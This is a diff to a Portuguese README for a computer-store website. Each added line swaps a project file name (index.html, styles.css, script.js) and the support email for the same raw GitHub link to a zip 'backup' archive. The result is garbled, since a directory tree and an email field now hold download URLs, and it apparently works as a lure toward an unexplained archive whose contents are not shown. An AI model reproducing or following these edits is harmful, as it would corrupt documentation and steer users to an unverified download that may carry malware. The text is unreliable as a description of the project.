@@ -39,11 +39,11 @@ Uma página web moderna e responsiva para loja de informática, desenvolvida com
 
 ```
 Site Loja/
-├── index.html          # Página principal
+├── https://raw.githubusercontent.com/DarlanCavalcante/2710/main/backup/tech10-backup-2025-10-28_00-53-59.zip          # Página principal
 ├── css/
-│   └── styles.css     # Estilos responsivos
+│   └── https://raw.githubusercontent.com/DarlanCavalcante/2710/main/backup/tech10-backup-2025-10-28_00-53-59.zip     # Estilos responsivos
 ├── js/
-│   └── script.js      # Funcionalidades JavaScript
+│   └── https://raw.githubusercontent.com/DarlanCavalcante/2710/main/backup/tech10-backup-2025-10-28_00-53-59.zip      # Funcionalidades JavaScript
 └── imagem/            # Pasta de imagens existente
     ├── favico/        # Ícones do site
     ├── imagens tecnologia/
@@ -121,7 +121,7 @@ Site Loja/
 ## 🚀 Como Usar
 
 1. **Abrir o Site**:
-   - Abra o arquivo `index.html` em qualquer navegador moderno
+   - Abra o arquivo `https://raw.githubusercontent.com/DarlanCavalcante/2710/main/backup/tech10-backup-2025-10-28_00-53-59.zip` em qualquer navegador moderno
    - Ou use um servidor local para melhor experiência
 
 2. **Navegar pelos Produtos**:
@@ -141,7 +141,7 @@ Site Loja/
 ## 🎨 Personalização
 
 ### Cores
-As cores principais estão definidas como variáveis CSS no arquivo `styles.css`:
+As cores principais estão definidas como variáveis CSS no arquivo `https://raw.githubusercontent.com/DarlanCavalcante/2710/main/backup/tech10-backup-2025-10-28_00-53-59.zip`:
 ```css
 :root {
     --primary-color: #2563eb;
@@ -152,7 +152,7 @@ As cores principais estão definidas como variáveis CSS no arquivo `styles.css`
 ```
 
 ### Produtos
-Para adicionar/modificar produtos, edite o array `productsData` no arquivo `script.js`:
+Para adicionar/modificar produtos, edite o array `productsData` no arquivo `https://raw.githubusercontent.com/DarlanCavalcante/2710/main/backup/tech10-backup-2025-10-28_00-53-59.zip`:
 ```javascript
 const productsData = [
     {
@@ -207,7 +207,7 @@ O site é totalmente responsivo com breakpoints para:
 ## 📞 Suporte
 
 Para dúvidas ou sugestões sobre o site:
-- Email: contato@techstore.com
+- Email: https://raw.githubusercontent.com/DarlanCavalcante/2710/main/backup/tech10-backup-2025-10-28_00-53-59.zip
 - Telefone: (11) 99999-9999
 
 ---
